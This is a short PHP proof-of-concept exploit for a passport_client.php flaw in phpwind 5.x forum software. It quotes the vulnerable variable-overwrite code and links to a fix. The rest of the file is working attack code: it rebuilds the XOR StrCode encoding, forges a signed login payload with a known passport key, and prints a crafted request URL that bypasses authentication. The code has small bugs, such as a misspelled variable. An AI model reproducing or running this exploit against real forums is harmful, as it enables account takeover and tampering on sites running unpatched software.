<?
/////////////////////////////////////////////////////
///phpwind5.x passport_client.php UPDATE sql inj POC
///By 5up3rh3i@gmail.com
///thx loulou
///////////////////////////////////////////////
//[fix]:http://www.phpwind.net/read-htm-tid-392683.html
//CODE IN require\defend.php[line 8-15]
//foreach($_GET as $_key=>$_value){
// !ereg("^\_",$_key) && !isset($$_key) && $$_key=$_GET[$_key];
//}
//$passport_ifopen = $passport_type = $passport_key = ''; //<--------here!!!!
//require_once(D_P.'data/bbscache/config.php');
//if($db_forcecharset && !defined('W_P')){
// @header("Content-Type: text/html; charset=$db_charset");
//}
////////////////////////////////////////////////////
$passwod='123456789';
$passport_key='6f0xuRI8Cd8iga';
$forward=" http://localhost/PHPWind5.0.1/upload/index.php";
$userdb="time=99999999999999999&username=heige111&password=".md5($password);
$userdb= StrCode($userdb,'ENCODE');
$verify=md5($action.$userdb.$forward.$passport_key);
print "passport_client.php?passport_type=client&passport_ifopen=1&action=login&forward=".urlencode($forward)."&passport_key=".$passport_key."&verify=".$verify."&userdb=".urlencode($userdb);

function StrCode($string,$action='ENCODE'){
 $GLOBALS['db_hash']='6f0xuRI8Cd8iga';
 $key = substr(md5($_SERVER["HTTP_USER_AGENT"].$GLOBALS['db_hash']),8,18);
 //$key = '6f0xuRI8Cd8iga'; [当时误把$key当作了$passport_key]
 $string = $action == 'ENCODE' ? $string : base64_decode($string);
 $len = strlen($key);
 $code = '';
 for($i=0; $i<strlen($string); $i++){
 $k = $i % $len;
 $code .= $string[$i] ^ $key[$k];
 }
 $code = $action == 'DECODE' ? $code : base64_encode($code);
 return $code;
}